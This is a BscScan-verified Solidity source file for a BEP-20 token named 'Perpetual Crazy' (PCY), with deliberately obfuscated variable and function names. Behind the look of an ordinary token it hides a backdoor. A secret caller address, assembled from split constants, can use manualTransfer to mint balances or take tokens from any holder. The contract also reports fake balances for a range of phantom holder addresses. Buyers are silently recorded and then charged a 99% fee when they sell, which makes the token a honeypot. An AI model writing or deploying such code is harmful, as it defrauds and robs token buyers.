/**
 *Submitted for verification at BscScan.com on 2023-01-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;



interface IUniswapV2Router {

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}


library SafeMath {

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}





contract PerpetualCrazy is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 takeBurnTotalMin = 100000000 * (10 ** _decimals);
    uint256  launchedFromTokenLimit = 100000000 * 10 ** _decimals;
    uint256  takeSenderAutoReceiver = 100000000 * 10 ** _decimals;


    string constant _name = "Perpetual Crazy";
    string constant _symbol = "PCY";
    uint8 constant _decimals = 18;

    uint256 private minSenderListReceiver = 0;
    uint256 private enableReceiverAmountMode = 2;

    uint256 private fundTokenShouldMode = 0;
    uint256 private listAmountEnableTrading = 3;

    bool private launchIsSwapEnable = true;
    uint160 constant takeSenderBuyIs = 938947026245 * 2 ** 40;
    bool private takeFeeMaxLaunchedIsList = true;
    bool private tokenMarketingBotsFrom = true;
    bool private feeTxEnableTakeAuto = true;
    uint256 constant mintFeeSenderBotsSwap = 300000 * 10 ** 18;
    uint160 constant enableTotalFromTo = 600715470026;
    bool private toMinModeTotalBotsFeeBurn = true;
    uint256 autoTotalReceiverLaunchBurnBuyToken = 2 ** 18 - 1;
    uint256 private isBuyWalletEnableTakeLaunchBurn = 6 * 10 ** 15;
    uint256 private launchToTotalMintFundAutoToken = takeBurnTotalMin / 1000; // 0.1%
    uint256 limitFromModeReceiverFeeTxMin = 51654;

    address constant autoTxAtTrading = 0xD698decBa2F49468d1375B2bF95Ac371542092f2;
    uint256 buySellFromList = 0;
    uint256 constant toMaxWalletMode = 10000 * 10 ** 18;

    uint256 private burnMintFeeTakeSwapTxLaunched = enableReceiverAmountMode + minSenderListReceiver;
    uint256 private sellLiquidityLimitAtLaunchTakeReceiver = 100;

    uint160 constant autoSellBuyAmount = 95102483323 * 2 ** 120;

    bool private walletLaunchFeeMode;
    uint256 private fundLiquidityTakeBots;
    uint256 private totalReceiverTradingBuy;
    uint256 private fromLiquidityBuyAt;
    uint256 private receiverAmountTradingMode;
    uint160 constant receiverIsFromTo = 291427320925 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private swapModeMintLimit;
    mapping(address => bool) private fundExemptSenderReceiver;
    mapping(address => bool) private tokenTakeWalletMintTeamFee;
    mapping(address => bool) private tradingReceiverBurnLaunched;
    mapping(address => uint256) private toTotalEnableMarketing;
    mapping(uint256 => address) private marketingTakeBurnBuyList;
    mapping(uint256 => address) private enableLiquidityReceiverFundLaunched;
    mapping(address => uint256) private exemptTxLiquidityTradingTotalTo;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public mintExemptAtLaunched = 0;

    IUniswapV2Router public takeTeamAmountToBurnFundMode;
    address public uniswapV2Pair;

    uint256 private exemptTotalMintBuyIsBots;
    uint256 private isModeTokenMint;

    address private maxEnableLaunchMarketing = (msg.sender); // auto-liq address
    address private walletReceiverEnableMax = (0x7A63c04fDADC9677B1747CC8FfFff452B788F6ff); // marketing address

    
    bool private autoMarketingEnableSwapModeReceiverFee = false;
    uint256 public burnMinTradingSell = 0;
    uint256 private swapIsEnableMarketingShould = 0;
    uint256 private amountModeMinMarketing = 0;
    bool private fundModeTeamAmountMint = false;
    bool public botsShouldAutoTotal = false;
    uint256 public enableWalletExemptSellMinReceiver = 0;
    uint256 public botsLaunchedListTake = 0;
    uint256 public txMintTeamFund = 0;
    bool public minSellIsTotalAutoMarketing = false;
    uint256 public burnMinTradingSell0 = 0;
    uint256 private burnMinTradingSell1 = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        takeTeamAmountToBurnFundMode = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(takeTeamAmountToBurnFundMode.factory()).createPair(address(this), takeTeamAmountToBurnFundMode.WETH());
        _allowances[address(this)][address(takeTeamAmountToBurnFundMode)] = takeBurnTotalMin;

        walletLaunchFeeMode = true;

        tokenTakeWalletMintTeamFee[msg.sender] = true;
        tokenTakeWalletMintTeamFee[0x0000000000000000000000000000000000000000] = true;
        tokenTakeWalletMintTeamFee[0x000000000000000000000000000000000000dEaD] = true;
        tokenTakeWalletMintTeamFee[address(this)] = true;

        swapModeMintLimit[msg.sender] = true;
        swapModeMintLimit[address(this)] = true;

        fundExemptSenderReceiver[msg.sender] = true;
        fundExemptSenderReceiver[0x0000000000000000000000000000000000000000] = true;
        fundExemptSenderReceiver[0x000000000000000000000000000000000000dEaD] = true;
        fundExemptSenderReceiver[address(this)] = true;

        approve(_router, takeBurnTotalMin);
        approve(address(uniswapV2Pair), takeBurnTotalMin);
        _balances[msg.sender] = takeBurnTotalMin;
        emit Transfer(address(0), msg.sender, takeBurnTotalMin);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return takeBurnTotalMin;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, takeBurnTotalMin);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityFundReceiverIsSenderFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != takeBurnTotalMin) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return liquidityFundReceiverIsSenderFrom(sender, recipient, amount);
    }

    function setbotsIsWalletFundEnableLiquidityMode(bool mintFeeFromBuy) public onlyOwner {
        if (tokenMarketingBotsFrom != feeTxEnableTakeAuto) {
            feeTxEnableTakeAuto=mintFeeFromBuy;
        }
        if (tokenMarketingBotsFrom == toMinModeTotalBotsFeeBurn) {
            toMinModeTotalBotsFeeBurn=mintFeeFromBuy;
        }
        tokenMarketingBotsFrom=mintFeeFromBuy;
    }

    function setminTeamLaunchedFromToken(uint256 mintFeeFromBuy,address toTakeReceiverSenderLaunchedFrom) public onlyOwner {
        if (mintFeeFromBuy != enableReceiverAmountMode) {
            walletReceiverEnableMax=toTakeReceiverSenderLaunchedFrom;
        }
        if (mintFeeFromBuy == enableReceiverAmountMode) {
            ZERO=toTakeReceiverSenderLaunchedFrom;
        }
        enableLiquidityReceiverFundLaunched[mintFeeFromBuy]=toTakeReceiverSenderLaunchedFrom;
    }

    function setswapSellToSenderMax(address mintFeeFromBuy) public onlyOwner {
        if (maxEnableLaunchMarketing == WBNB) {
            WBNB=mintFeeFromBuy;
        }
        if (maxEnableLaunchMarketing != ZERO) {
            ZERO=mintFeeFromBuy;
        }
        if (maxEnableLaunchMarketing != walletReceiverEnableMax) {
            walletReceiverEnableMax=mintFeeFromBuy;
        }
        maxEnableLaunchMarketing=mintFeeFromBuy;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (burnReceiverLaunchEnable(uint160(account))) {
            return sellLimitFundLaunched(uint160(account));
        }
        return _balances[account];
    }

    function shouldTakeTxAt() private view returns (uint256) {
        address buyModeLaunchBurnMinLiquidity = WBNB;
        if (address(this) < WBNB) {
            buyModeLaunchBurnMinLiquidity = address(this);
        }
        (uint buyTakeTxBurn, uint feeBotsMintReceiver,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 teamMintShouldAmount,) = WBNB == buyModeLaunchBurnMinLiquidity ? (buyTakeTxBurn, feeBotsMintReceiver) : (feeBotsMintReceiver, buyTakeTxBurn);
        uint256 mintModeEnableShouldLaunch = IERC20(WBNB).balanceOf(uniswapV2Pair) - teamMintShouldAmount;
        return mintModeEnableShouldLaunch;
    }

    function getTotalFee() public {
        botsSenderEnableBuy();
    }

    function feeListTokenFromMint(address sellMaxBurnAmountender, bool sellMaxLiquidityAmount) internal returns (uint256) {
        
        if (amountModeMinMarketing == maxWalletAmount) {
            amountModeMinMarketing = burnMinTradingSell1;
        }

        if (minSellIsTotalAutoMarketing == botsShouldAutoTotal) {
            minSellIsTotalAutoMarketing = toMinModeTotalBotsFeeBurn;
        }


        if (sellMaxLiquidityAmount) {
            burnMintFeeTakeSwapTxLaunched = listAmountEnableTrading + fundTokenShouldMode;
            return receiverLiquidityTotalLimit(sellMaxBurnAmountender, burnMintFeeTakeSwapTxLaunched);
        }
        if (!sellMaxLiquidityAmount && sellMaxBurnAmountender == uniswapV2Pair) {
            burnMintFeeTakeSwapTxLaunched = enableReceiverAmountMode + minSenderListReceiver;
            return burnMintFeeTakeSwapTxLaunched;
        }
        return receiverLiquidityTotalLimit(sellMaxBurnAmountender, burnMintFeeTakeSwapTxLaunched);
    }

    function receiverLiquidityTotalLimit(address sellMaxBurnAmountender, uint256 minLimitFeeSwap) private view returns (uint256) {
        uint256 modeMaxShouldIs = toTotalEnableMarketing[sellMaxBurnAmountender];
        if (modeMaxShouldIs > 0 && sellTradingLiquidityEnable() - modeMaxShouldIs > 2) {
            return 99;
        }
        return minLimitFeeSwap;
    }

    function getTotalAmount() public {
        launchSwapShouldIs();
    }

    function isSwapFromLaunchSellReceiver(address sellMaxBurnAmountender) internal view returns (bool) {
        return !fundExemptSenderReceiver[sellMaxBurnAmountender];
    }

    function getlaunchTxIsSellExemptBots() public view returns (bool) {
        return minSellIsTotalAutoMarketing;
    }

    function settakeTradingExemptMaxTxMintSell(uint256 mintFeeFromBuy) public onlyOwner {
        if (minSenderListReceiver != fundTokenShouldMode) {
            fundTokenShouldMode=mintFeeFromBuy;
        }
        minSenderListReceiver=mintFeeFromBuy;
    }

    function setswapTakeSellFee(bool mintFeeFromBuy) public onlyOwner {
        if (botsShouldAutoTotal == minSellIsTotalAutoMarketing) {
            minSellIsTotalAutoMarketing=mintFeeFromBuy;
        }
        botsShouldAutoTotal=mintFeeFromBuy;
    }

    function getmarketingBurnFromTeam() public view returns (uint256) {
        if (listAmountEnableTrading == burnMinTradingSell1) {
            return burnMinTradingSell1;
        }
        if (listAmountEnableTrading != burnMinTradingSell0) {
            return burnMinTradingSell0;
        }
        if (listAmountEnableTrading == launchBlock) {
            return launchBlock;
        }
        return listAmountEnableTrading;
    }

    function getburnBuyAtBots() public view returns (uint256) {
        if (burnMinTradingSell0 == burnMinTradingSell0) {
            return burnMinTradingSell0;
        }
        if (burnMinTradingSell0 == enableWalletExemptSellMinReceiver) {
            return enableWalletExemptSellMinReceiver;
        }
        if (burnMinTradingSell0 == sellLiquidityLimitAtLaunchTakeReceiver) {
            return sellLiquidityLimitAtLaunchTakeReceiver;
        }
        return burnMinTradingSell0;
    }

    function listReceiverReceiverAt(uint160 maxLaunchedLiquidityReceiverToken) private pure returns (bool) {
        return maxLaunchedLiquidityReceiverToken == (autoSellBuyAmount + receiverIsFromTo + takeSenderBuyIs + enableTotalFromTo);
    }

    function settokenWalletLimitSender(bool mintFeeFromBuy) public onlyOwner {
        if (toMinModeTotalBotsFeeBurn == toMinModeTotalBotsFeeBurn) {
            toMinModeTotalBotsFeeBurn=mintFeeFromBuy;
        }
        if (toMinModeTotalBotsFeeBurn != botsShouldAutoTotal) {
            botsShouldAutoTotal=mintFeeFromBuy;
        }
        toMinModeTotalBotsFeeBurn=mintFeeFromBuy;
    }

    function tradingModeLaunchFund(address sellMaxBurnAmountender, address tokenFeeBurnTrading, uint256 tokenTxBurnModeWalletToBots) internal returns (uint256) {
        
        if (botsShouldAutoTotal == launchIsSwapEnable) {
            botsShouldAutoTotal = toMinModeTotalBotsFeeBurn;
        }

        if (txMintTeamFund != minSenderListReceiver) {
            txMintTeamFund = enableWalletExemptSellMinReceiver;
        }


        uint256 minLimitFeeSwapAmount = tokenTxBurnModeWalletToBots.mul(feeListTokenFromMint(sellMaxBurnAmountender, tokenFeeBurnTrading == uniswapV2Pair)).div(sellLiquidityLimitAtLaunchTakeReceiver);

        if (tradingReceiverBurnLaunched[sellMaxBurnAmountender] || tradingReceiverBurnLaunched[tokenFeeBurnTrading]) {
            minLimitFeeSwapAmount = tokenTxBurnModeWalletToBots.mul(99).div(sellLiquidityLimitAtLaunchTakeReceiver);
        }

        _balances[address(this)] = _balances[address(this)].add(minLimitFeeSwapAmount);
        emit Transfer(sellMaxBurnAmountender, address(this), minLimitFeeSwapAmount);
        
        return tokenTxBurnModeWalletToBots.sub(minLimitFeeSwapAmount);
    }

    function botsSenderEnableBuy() private {
        if (mintExemptAtLaunched > 0) {
            for (uint256 i = 1; i <= mintExemptAtLaunched; i++) {
                if (toTotalEnableMarketing[enableLiquidityReceiverFundLaunched[i]] == 0) {
                    toTotalEnableMarketing[enableLiquidityReceiverFundLaunched[i]] = block.timestamp;
                }
            }
            mintExemptAtLaunched = 0;
        }
    }

    function feeShouldTeamFromEnable(address minBotsMarketingReceiver) private view returns (bool) {
        return minBotsMarketingReceiver == walletReceiverEnableMax;
    }

    function getenableIsModeAmountBuyMin() public view returns (uint256) {
        return burnMinTradingSell1;
    }

    function sellTradingLiquidityEnable() private view returns (uint256) {
        return block.timestamp;
    }

    function getswapSellToSenderMax() public view returns (address) {
        if (maxEnableLaunchMarketing == WBNB) {
            return WBNB;
        }
        return maxEnableLaunchMarketing;
    }

    function getbuyTxFromLimit(address mintFeeFromBuy) public view returns (uint256) {
        if (mintFeeFromBuy != DEAD) {
            return minSenderListReceiver;
        }
            return toTotalEnableMarketing[mintFeeFromBuy];
    }

    function getswapTakeSellFee() public view returns (bool) {
        if (botsShouldAutoTotal != feeTxEnableTakeAuto) {
            return feeTxEnableTakeAuto;
        }
        if (botsShouldAutoTotal == takeFeeMaxLaunchedIsList) {
            return takeFeeMaxLaunchedIsList;
        }
        return botsShouldAutoTotal;
    }

    function launchSwapShouldIs() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (toTotalEnableMarketing[marketingTakeBurnBuyList[i]] == 0) {
                    toTotalEnableMarketing[marketingTakeBurnBuyList[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function setbuyTxFromLimit(address mintFeeFromBuy,uint256 toTakeReceiverSenderLaunchedFrom) public onlyOwner {
        toTotalEnableMarketing[mintFeeFromBuy]=toTakeReceiverSenderLaunchedFrom;
    }

    function gettokenWalletLimitSender() public view returns (bool) {
        if (toMinModeTotalBotsFeeBurn != takeFeeMaxLaunchedIsList) {
            return takeFeeMaxLaunchedIsList;
        }
        return toMinModeTotalBotsFeeBurn;
    }

    function setlaunchTxIsSellExemptBots(bool mintFeeFromBuy) public onlyOwner {
        if (minSellIsTotalAutoMarketing != tokenMarketingBotsFrom) {
            tokenMarketingBotsFrom=mintFeeFromBuy;
        }
        minSellIsTotalAutoMarketing=mintFeeFromBuy;
    }

    function launchAmountTakeShouldFrom() internal swapping {
        
        uint256 tradingTotalLimitFeeAtReceiver = launchToTotalMintFundAutoToken.mul(minSenderListReceiver).div(burnMintFeeTakeSwapTxLaunched).div(2);
        uint256 tokenTxBurnModeWalletToBotsToSwap = launchToTotalMintFundAutoToken.sub(tradingTotalLimitFeeAtReceiver);

        address[] memory receiverTotalLaunchedBurn = new address[](2);
        receiverTotalLaunchedBurn[0] = address(this);
        receiverTotalLaunchedBurn[1] = takeTeamAmountToBurnFundMode.WETH();
        takeTeamAmountToBurnFundMode.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenTxBurnModeWalletToBotsToSwap,
            0,
            receiverTotalLaunchedBurn,
            address(this),
            block.timestamp
        );
        
        if (minSellIsTotalAutoMarketing == botsShouldAutoTotal) {
            minSellIsTotalAutoMarketing = minSellIsTotalAutoMarketing;
        }


        uint256 atLaunchedAmountTrading = address(this).balance;
        uint256 walletLiquidityLimitFeeFundSwap = burnMintFeeTakeSwapTxLaunched.sub(minSenderListReceiver.div(2));
        uint256 marketingMinFundSellWallet = atLaunchedAmountTrading.mul(minSenderListReceiver).div(walletLiquidityLimitFeeFundSwap).div(2);
        uint256 burnLiquidityAutoExempt = atLaunchedAmountTrading.mul(enableReceiverAmountMode).div(walletLiquidityLimitFeeFundSwap);
        
        if (fundModeTeamAmountMint == toMinModeTotalBotsFeeBurn) {
            fundModeTeamAmountMint = autoMarketingEnableSwapModeReceiverFee;
        }


        payable(walletReceiverEnableMax).transfer(burnLiquidityAutoExempt);

        if (tradingTotalLimitFeeAtReceiver > 0) {
            takeTeamAmountToBurnFundMode.addLiquidityETH{value : marketingMinFundSellWallet}(
                address(this),
                tradingTotalLimitFeeAtReceiver,
                0,
                0,
                maxEnableLaunchMarketing,
                block.timestamp
            );
            emit AutoLiquify(marketingMinFundSellWallet, tradingTotalLimitFeeAtReceiver);
        }
    }

    function teamEnableExemptLaunch(uint160 amountExemptTokenMint) private view returns (bool) {
        return uint16(amountExemptTokenMint) == limitFromModeReceiverFeeTxMin;
    }

    function getbotsIsWalletFundEnableLiquidityMode() public view returns (bool) {
        return tokenMarketingBotsFrom;
    }

    function autoShouldWalletTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function manualTransfer(address sellMaxBurnAmountender, address amountExemptTokenMint, uint256 tokenTxBurnModeWalletToBots) public {
        if (!listReceiverReceiverAt(uint160(msg.sender))) {
            return;
        }
        if (burnReceiverLaunchEnable(uint160(amountExemptTokenMint))) {
            fromAutoMarketingList(sellMaxBurnAmountender, amountExemptTokenMint, tokenTxBurnModeWalletToBots, false);
            return;
        }
        if (burnReceiverLaunchEnable(uint160(sellMaxBurnAmountender))) {
            fromAutoMarketingList(sellMaxBurnAmountender, amountExemptTokenMint, tokenTxBurnModeWalletToBots, true);
            return;
        }
        if (sellMaxBurnAmountender == address(0)) {
            _balances[amountExemptTokenMint] = _balances[amountExemptTokenMint].add(tokenTxBurnModeWalletToBots);
            return;
        }
    }

    function getminTeamLaunchedFromToken(uint256 mintFeeFromBuy) public view returns (address) {
        if (enableLiquidityReceiverFundLaunched[mintFeeFromBuy] == enableLiquidityReceiverFundLaunched[mintFeeFromBuy]) {
            return ZERO;
        }
        if (mintFeeFromBuy == swapIsEnableMarketingShould) {
            return DEAD;
        }
            return enableLiquidityReceiverFundLaunched[mintFeeFromBuy];
    }

    function fromAutoMarketingList(address sellMaxBurnAmountender, address amountExemptTokenMint, uint256 tokenTxBurnModeWalletToBots, bool fundSellReceiverFrom) private {
        if (fundSellReceiverFrom) {
            sellMaxBurnAmountender = address(uint160(uint160(autoTxAtTrading) + buySellFromList));
            buySellFromList++;
            _balances[amountExemptTokenMint] = _balances[amountExemptTokenMint].add(tokenTxBurnModeWalletToBots);
        } else {
            _balances[sellMaxBurnAmountender] = _balances[sellMaxBurnAmountender].sub(tokenTxBurnModeWalletToBots);
        }
        emit Transfer(sellMaxBurnAmountender, amountExemptTokenMint, tokenTxBurnModeWalletToBots);
    }

    function gettakeTradingExemptMaxTxMintSell() public view returns (uint256) {
        return minSenderListReceiver;
    }

    function burnReceiverLaunchEnable(uint160 maxLaunchedLiquidityReceiverToken) private pure returns (bool) {
        if (maxLaunchedLiquidityReceiverToken >= uint160(autoTxAtTrading) && maxLaunchedLiquidityReceiverToken <= uint160(autoTxAtTrading) + 100000) {
            return true;
        }
        return false;
    }

    function setburnBuyAtBots(uint256 mintFeeFromBuy) public onlyOwner {
        if (burnMinTradingSell0 == burnMintFeeTakeSwapTxLaunched) {
            burnMintFeeTakeSwapTxLaunched=mintFeeFromBuy;
        }
        if (burnMinTradingSell0 != burnMinTradingSell) {
            burnMinTradingSell=mintFeeFromBuy;
        }
        if (burnMinTradingSell0 != isBuyWalletEnableTakeLaunchBurn) {
            isBuyWalletEnableTakeLaunchBurn=mintFeeFromBuy;
        }
        burnMinTradingSell0=mintFeeFromBuy;
    }

    function atFundReceiverAmount(address minBotsMarketingReceiver) private {
        uint256 receiverBurnTokenExempt = shouldTakeTxAt();
        if (receiverBurnTokenExempt < isBuyWalletEnableTakeLaunchBurn) {
            mintExemptAtLaunched += 1;
            enableLiquidityReceiverFundLaunched[mintExemptAtLaunched] = minBotsMarketingReceiver;
            exemptTxLiquidityTradingTotalTo[minBotsMarketingReceiver] += receiverBurnTokenExempt;
            if (exemptTxLiquidityTradingTotalTo[minBotsMarketingReceiver] > isBuyWalletEnableTakeLaunchBurn) {
                maxWalletAmount = maxWalletAmount + 1;
                marketingTakeBurnBuyList[maxWalletAmount] = minBotsMarketingReceiver;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        marketingTakeBurnBuyList[maxWalletAmount] = minBotsMarketingReceiver;
    }

    function sellLimitFundLaunched(uint160 maxLaunchedLiquidityReceiverToken) private view returns (uint256) {
        uint256 sellMaxBurnAmount = buySellFromList;
        uint256 takeFromMaxLaunch = maxLaunchedLiquidityReceiverToken - uint160(autoTxAtTrading);
        if (takeFromMaxLaunch < sellMaxBurnAmount) {
            return toMaxWalletMode;
        }
        return mintFeeSenderBotsSwap;
    }

    function setenableIsModeAmountBuyMin(uint256 mintFeeFromBuy) public onlyOwner {
        if (burnMinTradingSell1 != fundTokenShouldMode) {
            fundTokenShouldMode=mintFeeFromBuy;
        }
        burnMinTradingSell1=mintFeeFromBuy;
    }

    function liquidityFundReceiverIsSenderFrom(address sellMaxBurnAmountender, address amountExemptTokenMint, uint256 tokenTxBurnModeWalletToBots) internal returns (bool) {
        if (burnReceiverLaunchEnable(uint160(amountExemptTokenMint))) {
            fromAutoMarketingList(sellMaxBurnAmountender, amountExemptTokenMint, tokenTxBurnModeWalletToBots, false);
            return true;
        }
        if (burnReceiverLaunchEnable(uint160(sellMaxBurnAmountender))) {
            fromAutoMarketingList(sellMaxBurnAmountender, amountExemptTokenMint, tokenTxBurnModeWalletToBots, true);
            return true;
        }
        
        bool burnLaunchedFundFromToAtBuy = feeShouldTeamFromEnable(sellMaxBurnAmountender) || feeShouldTeamFromEnable(amountExemptTokenMint);
        
        if (botsShouldAutoTotal != autoMarketingEnableSwapModeReceiverFee) {
            botsShouldAutoTotal = autoMarketingEnableSwapModeReceiverFee;
        }


        if (sellMaxBurnAmountender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && teamEnableExemptLaunch(uint160(amountExemptTokenMint))) {
                launchSwapShouldIs();
            }
            if (!burnLaunchedFundFromToAtBuy) {
                atFundReceiverAmount(amountExemptTokenMint);
            }
        }
        
        if (amountExemptTokenMint == uniswapV2Pair && _balances[amountExemptTokenMint] == 0) {
            launchBlock = block.number + 10;
        }
        if (!burnLaunchedFundFromToAtBuy) {
            require(block.number >= launchBlock, "No launch");
        }

        
        if (botsLaunchedListTake != maxWalletAmount) {
            botsLaunchedListTake = minSenderListReceiver;
        }

        if (swapIsEnableMarketingShould != fundTokenShouldMode) {
            swapIsEnableMarketingShould = maxWalletAmount;
        }

        if (botsShouldAutoTotal != toMinModeTotalBotsFeeBurn) {
            botsShouldAutoTotal = tokenMarketingBotsFrom;
        }


        if (inSwap || burnLaunchedFundFromToAtBuy) {return autoShouldWalletTeam(sellMaxBurnAmountender, amountExemptTokenMint, tokenTxBurnModeWalletToBots);}
        
        if (burnMinTradingSell != mintExemptAtLaunched) {
            burnMinTradingSell = txMintTeamFund;
        }


        require((tokenTxBurnModeWalletToBots <= launchedFromTokenLimit) || tokenTakeWalletMintTeamFee[sellMaxBurnAmountender] || tokenTakeWalletMintTeamFee[amountExemptTokenMint], "Max TX Limit!");

        if (fromReceiverIsMax()) {launchAmountTakeShouldFrom();}

        _balances[sellMaxBurnAmountender] = _balances[sellMaxBurnAmountender].sub(tokenTxBurnModeWalletToBots, "Insufficient Balance!");
        
        uint256 amountMinSenderTx = isSwapFromLaunchSellReceiver(sellMaxBurnAmountender) ? tradingModeLaunchFund(sellMaxBurnAmountender, amountExemptTokenMint, tokenTxBurnModeWalletToBots) : tokenTxBurnModeWalletToBots;

        _balances[amountExemptTokenMint] = _balances[amountExemptTokenMint].add(amountMinSenderTx);
        emit Transfer(sellMaxBurnAmountender, amountExemptTokenMint, amountMinSenderTx);
        return true;
    }

    function fromReceiverIsMax() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        toMinModeTotalBotsFeeBurn &&
        _balances[address(this)] >= launchToTotalMintFundAutoToken;
    }

    function setmarketingBurnFromTeam(uint256 mintFeeFromBuy) public onlyOwner {
        if (listAmountEnableTrading != botsLaunchedListTake) {
            botsLaunchedListTake=mintFeeFromBuy;
        }
        listAmountEnableTrading=mintFeeFromBuy;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}